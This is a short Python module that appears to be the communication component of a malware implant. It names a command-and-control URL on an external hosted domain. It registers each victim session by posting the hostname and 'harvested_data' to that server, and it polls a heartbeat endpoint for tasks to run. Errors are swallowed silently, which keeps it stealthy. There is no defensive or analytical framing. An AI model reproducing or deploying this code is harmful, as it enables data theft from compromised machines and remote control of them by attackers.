import requests
import uuid

C2_URL = "https://tether-c2-communication-line-by-ebowluh.onrender.com" 
REGISTER_ENDPOINT = "/api/register"
HEARTBEAT_ENDPOINT = "/api/heartbeat"

session_id = str(uuid.uuid4())

def register_with_c2(hostname, harvested_data):
    payload = {"session_id": session_id, "hostname": hostname, "data": harvested_data}
    try:
        requests.post(C2_URL + REGISTER_ENDPOINT, json=payload, timeout=15)
    except requests.RequestException: pass

def send_heartbeat():
    """Sends a heartbeat and returns any tasks from the server."""
    payload = {"session_id": session_id}
    try:
        response = requests.post(C2_URL + HEARTBEAT_ENDPOINT, json=payload, timeout=10)
        if response.status_code == 200:
            return response.json() # Return the server's response
    except requests.RequestException:
        pass
    return None # Return None if the request fails